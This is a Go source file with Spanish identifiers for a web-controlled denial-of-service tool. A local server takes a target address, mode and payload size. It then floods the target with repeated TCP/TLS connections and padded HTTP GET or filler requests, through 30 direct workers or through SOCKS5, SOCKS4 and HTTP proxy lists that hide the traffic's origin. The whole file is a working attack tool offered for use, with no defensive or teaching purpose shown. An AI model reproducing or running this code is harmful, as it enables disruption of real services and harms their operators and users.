package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
)

var (
	mutex         sync.Mutex
	clients       = make(map[*websocket.Conn]bool)
	broadcast     = make(chan string, 1000)
	upgrader      = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	activeWorkers int32
	totalRequests uint64

	attackCancel context.CancelFunc
	attackCtx    context.Context
	attackMutex  sync.Mutex
)

func logMsg(format string, a ...interface{}) {
	msg := fmt.Sprintf(format, a...)
	fmt.Println(msg)
	select {
	case broadcast <- msg:
	default:
	}
}

func main() {
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigs
		fmt.Println("\n[!] Interrupción detectada (Ctrl+C). Forzando cierre...")
		detenerAtaque()
		time.Sleep(100 * time.Millisecond)
		os.Exit(0)
	}()

	if _, err := os.Stat("proxies.txt"); os.IsNotExist(err) {
		os.WriteFile("proxies.txt", []byte(""), 0644)
	}
	if _, err := os.Stat("proxies_http.txt"); os.IsNotExist(err) {
		os.WriteFile("proxies_http.txt", []byte(""), 0644)
	}
	if _, err := os.Stat("proxies_socks4.txt"); os.IsNotExist(err) {
		os.WriteFile("proxies_socks4.txt", []byte(""), 0644)
	}

	fs := http.FileServer(http.Dir("./public"))
	http.Handle("/", fs)

	http.HandleFunc("/ws", handleConnections)
	http.HandleFunc("/api/proxies", handleProxies)
	http.HandleFunc("/api/proxies/stats", handleProxiesStats)
	http.HandleFunc("/api/atacar", handleAtacar)
	http.HandleFunc("/api/parar", handleParar)

	go handleMessages()

	port := ":3000"
	logMsg("[+] Servidor Go activo en http://localhost%s", port)
	if err := http.ListenAndServe(port, nil); err != nil {
		logMsg("[-] Error crítico: %v", err)
	}
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	mutex.Lock()
	clients[ws] = true
	mutex.Unlock()
}

func handleMessages() {
	for {
		msg := <-broadcast
		mutex.Lock()
		for client := range clients {
			err := client.WriteMessage(websocket.TextMessage, []byte(msg))
			if err != nil {
				client.Close()
				delete(clients, client)
			}
		}
		mutex.Unlock()
	}
}

func contarLineasValidas(archivo string) int {
	data, err := os.ReadFile(archivo)
	if err != nil {
		return 0
	}
	lines := strings.Split(string(data), "\n")
	count := 0
	for _, l := range lines {
		if strings.TrimSpace(l) != "" {
			count++
		}
	}
	return count
}

func handleProxiesStats(w http.ResponseWriter, r *http.Request) {
	socks5Count := contarLineasValidas("proxies.txt")
	httpCount := contarLineasValidas("proxies_http.txt")
	socks4Count := contarLineasValidas("proxies_socks4.txt")

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{
		"socks5": socks5Count,
		"socks4": socks4Count,
		"http":   httpCount,
		"total":  socks5Count + httpCount + socks4Count,
	})
}

func handleProxies(w http.ResponseWriter, r *http.Request) {
	tipo := r.URL.Query().Get("tipo")
	archivo := "proxies.txt"
	if tipo == "http" {
		archivo = "proxies_http.txt"
	} else if tipo == "socks4" {
		archivo = "proxies_socks4.txt"
	}

	if r.Method == http.MethodGet {
		data, _ := os.ReadFile(archivo)
		w.Write(data)
	} else if r.Method == http.MethodPost {
		var body struct {
			Tipo      string `json:"tipo"`
			Contenido string `json:"contenido"`
		}
		json.NewDecoder(r.Body).Decode(&body)
		targetFile := "proxies.txt"
		if body.Tipo == "http" {
			targetFile = "proxies_http.txt"
		} else if body.Tipo == "socks4" {
			targetFile = "proxies_socks4.txt"
		}
		os.WriteFile(targetFile, []byte(body.Contenido), 0644)
		logMsg("[+] Lista %s actualizada con éxito.", targetFile)
	}
}

type AttackRequest struct {
	IP        string `json:"ip"`
	Puerto    string `json:"puerto"`
	Tamano    int    `json:"tamano"`
	Delay     int    `json:"delay"`
	Protocolo string `json:"protocolo"`
	Modo      string `json:"modo"`
}

type TargetInfo struct {
	Host  string
	Port  string
	Path  string
	IsTLS bool
}

func parsearDestino(rawInput, defaultPort string) TargetInfo {
	input := strings.TrimSpace(rawInput)

	parsed, err := url.Parse(input)
	if err != nil || (parsed.Scheme == "" && !strings.Contains(input, "://")) {
		parsed, err = url.Parse("http://" + input)
		if err != nil {
			return TargetInfo{Host: input, Port: defaultPort, Path: "/", IsTLS: false}
		}
	}

	host := parsed.Hostname()
	if host == "" {
		host = input
	}

	port := parsed.Port()
	isTLS := parsed.Scheme == "https"

	if port == "" {
		if isTLS {
			port = "443"
		} else if defaultPort != "" {
			port = defaultPort
		} else {
			port = "80"
		}
	}

	path := parsed.RequestURI()
	if path == "" {
		path = "/"
	}

	return TargetInfo{
		Host:  host,
		Port:  port,
		Path:  path,
		IsTLS: isTLS,
	}
}

func handleAtacar(w http.ResponseWriter, r *http.Request) {
	var req AttackRequest
	json.NewDecoder(r.Body).Decode(&req)

	if req.IP == "" {
		logMsg("[-] Error: Falta la IP, dominio o URL de destino.")
		return
	}

	if req.Tamano <= 0 {
		req.Tamano = 512
	}
	if req.Delay < 0 {
		req.Delay = 0
	}

	detenerAtaque()
	atomic.StoreUint64(&totalRequests, 0)

	attackMutex.Lock()
	attackCtx, attackCancel = context.WithCancel(context.Background())
	attackMutex.Unlock()

	logMsg("[+] ¡LANZAMIENTO! -> Destino bruto: %s | Proto: %s | Modo: %s", req.IP, req.Protocolo, req.Modo)

	if req.Modo == "proxies" {
		go iniciarAtaqueMasivoProxies(attackCtx, req.IP, req.Puerto, req.Tamano, req.Delay, "socks5", req.Protocolo)
		go iniciarAtaqueMasivoProxies(attackCtx, req.IP, req.Puerto, req.Tamano, req.Delay, "socks4", req.Protocolo)
		go iniciarAtaqueMasivoProxies(attackCtx, req.IP, req.Puerto, req.Tamano, req.Delay, "http", req.Protocolo)
	} else {
		go iniciarAtaqueMasivoDirecto(attackCtx, req.IP, req.Puerto, req.Tamano, req.Delay, req.Protocolo)
	}
}

func handleParar(w http.ResponseWriter, r *http.Request) {
	detenerAtaque()
	logMsg("[!] Operación detenida explícitamente. Total peticiones enviadas: %d", atomic.LoadUint64(&totalRequests))
}

func detenerAtaque() {
	attackMutex.Lock()
	if attackCancel != nil {
		attackCancel()
		attackCancel = nil
	}
	attackMutex.Unlock()
}

func generarPayloadDirecto(tInfo TargetInfo, tamano int, protocolo string) []byte {
	hostHeader := tInfo.Host
	if tInfo.Port != "80" && tInfo.Port != "443" {
		hostHeader = fmt.Sprintf("%s:%s", tInfo.Host, tInfo.Port)
	}

	var base string
	if protocolo == "HTTP_Flood" {
		base = fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n", tInfo.Path, hostHeader)
	} else {
		base = fmt.Sprintf("X-Flood-Data: %s\r\n", strings.Repeat("A", 10))
	}

	if len(base) < tamano {
		base += strings.Repeat("X", tamano-len(base))
	} else if len(base) > tamano {
		base = base[:tamano]
	}
	return []byte(base)
}

func iniciarAtaqueMasivoDirecto(ctx context.Context, rawInput, defaultPuerto string, tamano int, delay int, protocolo string) {
	tInfo := parsearDestino(rawInput, defaultPuerto)
	addr := fmt.Sprintf("%s:%s", tInfo.Host, tInfo.Port)
	payload := generarPayloadDirecto(tInfo, tamano, protocolo)

	for w := 0; w < 30; w++ {
		atomic.AddInt32(&activeWorkers, 1)
		go func() {
			defer atomic.AddInt32(&activeWorkers, -1)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				var conn net.Conn
				var err error

				if tInfo.IsTLS {
					dialer := &net.Dialer{Timeout: 1 * time.Second}
					conn, err = tls.DialWithDialer(dialer, "tcp", addr, &tls.Config{
						InsecureSkipVerify: true,
					})
				} else {
					conn, err = net.DialTimeout("tcp", addr, 1*time.Second)
				}

				if err == nil {
					conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
					conn.Write(payload)
					conn.Close()
					atomic.AddUint64(&totalRequests, 1)
					schemeStr := "HTTP"
					if tInfo.IsTLS {
						schemeStr = "HTTPS"
					}
					logMsg("[%s DIRECTO] Enviado a %s%s", schemeStr, addr, tInfo.Path)
				}

				if delay > 0 {
					select {
					case <-ctx.Done():
						return
					case <-time.After(time.Duration(delay) * time.Millisecond):
					}
				}
			}
		}()
	}
}

func iniciarAtaqueMasivoProxies(ctx context.Context, rawInput, defaultPuerto string, tamano int, delay int, tipoProxy string, protocolo string) {
	archivo := "proxies.txt"
	if tipoProxy == "http" {
		archivo = "proxies_http.txt"
	} else if tipoProxy == "socks4" {
		archivo = "proxies_socks4.txt"
	}

	data, err := os.ReadFile(archivo)
	if err != nil || len(data) == 0 {
		return
	}

	proxies := strings.Split(string(data), "\n")
	var validos []string
	for _, p := range proxies {
		p = strings.TrimSpace(p)
		if p != "" {
			validos = append(validos, p)
		}
	}

	if len(validos) == 0 {
		return
	}

	tInfo := parsearDestino(rawInput, defaultPuerto)
	logMsg("[+] Oleada activada con %d proxies [%s] hacia %s:%s", len(validos), strings.ToUpper(tipoProxy), tInfo.Host, tInfo.Port)

	for _, proxyAddr := range validos {
		atomic.AddInt32(&activeWorkers, 1)
		go func(pProxy string, tProxy string) {
			defer atomic.AddInt32(&activeWorkers, -1)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				pConn, err := net.DialTimeout("tcp", pProxy, 2*time.Second)
				if err != nil {
					select {
					case <-ctx.Done():
						return
					case <-time.After(1 * time.Second):
						continue
					}
				}

				if tProxy == "socks5" {
					pConn.Write([]byte{0x05, 0x01, 0x00})
					buf := make([]byte, 2)
					pConn.SetReadDeadline(time.Now().Add(1 * time.Second))
					_, err = pConn.Read(buf)
					if err != nil {
						pConn.Close()
						continue
					}

					ipObj := net.ParseIP(tInfo.Host)
					if ipObj != nil && ipObj.To4() != nil {
						req := []byte{0x05, 0x01, 0x00, 0x01}
						req = append(req, ipObj.To4()...)
						pInt := int(parsePort(tInfo.Port))
						req = append(req, byte(pInt>>8), byte(pInt&0xFF))
						pConn.Write(req)

						resp := make([]byte, 10)
						pConn.Read(resp)
					}

					payload := generarPayloadDirecto(tInfo, tamano, protocolo)
					if tInfo.IsTLS {
						tlsConn := tls.Client(pConn, &tls.Config{InsecureSkipVerify: true})
						tlsConn.SetWriteDeadline(time.Now().Add(1 * time.Second))
						tlsConn.Write(payload)
						tlsConn.Close()
					} else {
						pConn.SetWriteDeadline(time.Now().Add(1 * time.Second))
						pConn.Write(payload)
						pConn.Close()
					}

				} else if tProxy == "socks4" {
					// Implementación SOCKS4
					ipObj := net.ParseIP(tInfo.Host)
					if ipObj != nil && ipObj.To4() != nil {
						pInt := int(parsePort(tInfo.Port))
						req := []byte{0x04, 0x01, byte(pInt >> 8), byte(pInt & 0xFF)}
						req = append(req, ipObj.To4()...)
						req = append(req, 0x00) // User ID vacío terminado en null
						pConn.Write(req)

						resp := make([]byte, 8)
						pConn.SetReadDeadline(time.Now().Add(1 * time.Second))
						pConn.Read(resp)
					}

					payload := generarPayloadDirecto(tInfo, tamano, protocolo)
					if tInfo.IsTLS {
						tlsConn := tls.Client(pConn, &tls.Config{InsecureSkipVerify: true})
						tlsConn.SetWriteDeadline(time.Now().Add(1 * time.Second))
						tlsConn.Write(payload)
						tlsConn.Close()
					} else {
						pConn.SetWriteDeadline(time.Now().Add(1 * time.Second))
						pConn.Write(payload)
						pConn.Close()
					}

				} else if tProxy == "http" {
					scheme := "http"
					if tInfo.IsTLS {
						scheme = "https"
					}
					targetURL := fmt.Sprintf("%s://%s:%s%s", scheme, tInfo.Host, tInfo.Port, tInfo.Path)
					if tInfo.Port == "80" || tInfo.Port == "443" {
						targetURL = fmt.Sprintf("%s://%s%s", scheme, tInfo.Host, tInfo.Path)
					}
					hostHeader := fmt.Sprintf("%s:%s", tInfo.Host, tInfo.Port)
					httpReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", targetURL, hostHeader)

					pConn.SetWriteDeadline(time.Now().Add(1 * time.Second))
					_, err = pConn.Write([]byte(httpReq))
					if err != nil {
						pConn.Close()
						continue
					}
					pConn.Close()
				}

				atomic.AddUint64(&totalRequests, 1)
				logMsg("[%s PROXY] %s -> %s://%s:%s%s", strings.ToUpper(tProxy), pProxy, map[bool]string{true: "https", false: "http"}[tInfo.IsTLS], tInfo.Host, tInfo.Port, tInfo.Path)

				if delay > 0 {
					select {
					case <-ctx.Done():
						return
					case <-time.After(time.Duration(delay) * time.Millisecond):
					}
				}
			}
		}(proxyAddr, tipoProxy)
	}
}

func parsePort(pStr string) uint16 {
	var p int
	fmt.Sscanf(pStr, "%d", &p)
	return uint16(p)
}
